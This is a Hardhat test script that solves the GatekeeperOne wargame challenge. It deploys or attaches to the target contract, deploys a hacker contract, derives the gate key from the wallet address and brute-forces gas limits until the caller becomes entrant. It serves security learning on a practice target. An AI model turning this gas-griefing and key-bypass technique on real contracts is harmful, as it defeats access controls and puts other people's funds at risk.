/* eslint-disable no-undef */
// Right click on the script name and hit "Run" to execute
import { expect } from "chai";
import { network } from "hardhat";
import { GatekeeperOne } from "../types/ethers-contracts/GatekeeperOne.js";
import { GatekeeperOneHacker } from "../types/ethers-contracts/GatekeeperOneHacker.js";
import { GatekeeperOneFake } from "../types/ethers-contracts/GatekeeperOneFake.js";

const { ethers } = await network.connect();

describe("NetworkInfo", () => {
  it('logs network info', async () => {
    const network = await ethers.provider.getNetwork();
    console.log("Connected network:", network.name);
  })
})

describe("GatekeeperOneHacker", function () {
  let deployedGatekeeperOne: GatekeeperOne;
  let hacker: GatekeeperOneHacker;
  let fake: GatekeeperOneFake;
  it("test initial value", async function () {
    const network = await ethers.provider.getNetwork();
    if (network.name === "default") {
      const GatekeeperOne = await ethers.getContractFactory("GatekeeperOne");
      deployedGatekeeperOne = await GatekeeperOne.deploy();
      console.log("gatekeeperOne deployed at:" + await deployedGatekeeperOne.getAddress());
      const result = await deployedGatekeeperOne.entrant();
      expect(result).to.equal('0x0000000000000000000000000000000000000000');
    } else {
      // get already deployed target contract from: 0xBE55Cd6C38f47119DA10d13Ec9c3a7d149960eC3
      deployedGatekeeperOne = await ethers.getContractAt("GatekeeperOne", "0xBE55Cd6C38f47119DA10d13Ec9c3a7d149960eC3");
      console.log("gatekeeperOne deployed at:" + await deployedGatekeeperOne.getAddress());
      const result = await deployedGatekeeperOne.entrant();
      expect(result).to.equal('0x0000000000000000000000000000000000000000');
    }
  });
  it.skip('deploys fake gatekeeper', async () => {
    const GatekeeperOneFake = await ethers.getContractFactory("GatekeeperOneFake");
    fake = await GatekeeperOneFake.deploy();
    console.log("gatekeeperOneFake deployed at:" + await fake.getAddress());
  })
  it('deploys gatekeeper hacker', async () => {
    const GatekeeperOneHacker = await ethers.getContractFactory("GatekeeperOneHacker");
    hacker = await GatekeeperOneHacker.deploy(await deployedGatekeeperOne.getAddress(), "0x0779122267283CcAE3BC423889B426d5e1948A74");
    const trx = await hacker.deploymentTransaction()
    console.log("deployment", trx?.hash)
    await trx?.wait();
    console.log("gatekeeperOneHacker deployed at:" + await hacker.getAddress());
    expect(await hacker.gasCostOfGateOne()).to.equal(140);
    const result = await hacker.gatekeeper();
    expect(await deployedGatekeeperOne.getAddress()).to.equal(result);
  })
  it('tests gas estimation', async () => {
    const trx = await hacker.checkGateOneGas({ gasLimit: 100_000 });
    console.log("Gas left after gateOne check:", trx.toString());
  })
  it('Gate 3 = checks key', async () => {
    const [wallet] = await ethers.getSigners();
    console.log("Wallet ", wallet.address, typeof wallet.address);
    const computedKey = await hacker.getDerivedKey(wallet.address);
    const result = await hacker.checkKey(computedKey, wallet.address);
    console.log("Computed key: ", computedKey, result);
    expect(result[0]).to.equal(true);
    expect(result[1]).to.equal(true);
    expect(result[2]).to.equal(true);
  })

  it("Gate 1, 2, and 3 via hacker contract (EIP-150 adjusted with empirical offset)", async function () {
    this.timeout(10200000);
    const [wallet] = await ethers.getSigners();
    const keyRaw = await hacker.getDerivedKey(wallet.address); // bytes8 key
    const key = keyRaw.slice(0, 18); // slice the hex string: '0x' + 16 hex chars = 8 bytes
    console.log("Wallet that should be entrant: ", wallet.address, keyRaw, key);

    let passed = false;
    let successfulGasLimit: number | undefined;

    // 205191 works in hardhat network
    // reached 205436
    // reached 206324
    // reached 206671
    const empiricalStart = 206324;
    const empiricalEnd = 206324 + 1000; // empirical range to test

    for (let gasLimit = empiricalStart; gasLimit <= empiricalEnd; gasLimit++) {
      if (passed) {
        break; // Exit loop if already successful
      }
      try {
        const gasArg = ethers.toBigInt(gasLimit);
        console.log("Calling callEnter with gasArg:", gasArg.toString());
        const tx = await hacker.connect(wallet).callEnter(key, gasArg, { gasLimit: 1_000_000 });
        const receipt = await tx.wait();
        console.log("✅ Success!", { gasLimit });
        const entrant = await deployedGatekeeperOne.entrant();
        console.log("Entrant address:", entrant);
        expect(entrant).to.equal(wallet.address);
        passed = true;
        break;
      } catch (err) {
        const reason = err?.error?.message || err?.reason || err?.toString();
        console.log("❌ Failed with gasLimit:", gasLimit, "Reason:", reason);
        // optional: log gasleft mod 8191 if you instrument the contract
      }
    }

    expect(passed).to.equal(true);
    console.log({ successfulGasLimit });
  });



});